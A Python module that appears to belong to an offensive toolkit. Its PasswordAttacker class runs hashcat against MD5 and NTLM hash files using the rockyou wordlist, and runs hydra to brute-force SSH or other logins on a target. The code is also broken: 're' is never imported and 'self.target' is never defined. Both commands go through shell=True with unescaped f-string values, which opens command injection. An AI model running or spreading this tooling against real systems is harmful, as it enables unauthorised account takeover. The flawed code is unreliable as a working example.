from typing import Dict
import subprocess
from pathlib import Path
from utils.logger import ExploitLogger

class PasswordAttacker:
    def __init__(self, hash_file: str, wordlist: str = None):
        self.hash_file = Path(hash_file)
        self.wordlist = wordlist or "/usr/share/wordlists/rockyou.txt"
        self.logger = ExploitLogger("password_attack")

    def _run_hashcat(self, mode: int = 0) -> Dict:
        """Run Hashcat with specified mode (0=MD5, 1000=NTLM)."""
        cmd = f"hashcat -m {mode} {self.hash_file} {self.wordlist} -O --force"
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=3600
            )
            cracked = re.findall(r"(?:[a-f0-9]{32}):(.+)", result.stdout)
            return {"cracked": cracked, "mode": mode}
        except subprocess.TimeoutExpired:
            self.logger.error("Hashcat timed out after 1 hour")
            return {}

    def _run_hydra(self, service: str = "ssh") -> Dict:
        """Brute-force SSH/FTP/HTTP."""
        cmd = f"hydra -L users.txt -P {self.wordlist} {service}://{self.target}"
        try:
            subprocess.run(cmd, shell=True, check=True)
            return {"status": "Completed"}
        except Exception as e:
            self.logger.error(f"Hydra failed: {e}")
            return {}

    def run(self) -> Dict:
        return {
            "hashcat_md5": self._run_hashcat(0),
            "hydra_ssh": self._run_hydra("ssh")
        }
